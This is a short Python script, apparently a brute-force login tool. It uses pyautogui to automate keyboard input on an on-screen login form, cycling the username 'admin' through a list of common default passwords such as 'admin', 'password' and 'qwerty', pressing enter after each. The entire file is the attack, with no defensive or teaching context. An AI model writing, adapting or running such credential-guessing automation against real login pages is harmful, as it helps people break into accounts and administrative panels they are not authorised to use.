import pyautogui
import time


TARGET_EMAIL = "admin"
PASSWORD_LIST = [
    "admin", 
    "password", 
    "12345678", 
    "qwerty", 
    "mysql",
    "admin123", 
]

def run_bruteforce():
    time.sleep(5)

    for password in PASSWORD_LIST:
        print(f"attempt by password :{password}")
        pyautogui.click()
        pyautogui.press('tab') 
        pyautogui.press('right')
      
 
        pyautogui.press('tab') 
        pyautogui.write(TARGET_EMAIL)


        pyautogui.press('tab') 
        pyautogui.write(password)
        
     
        pyautogui.press('enter')

        time.sleep(4)
       
   

if __name__ == "__main__":
    run_bruteforce()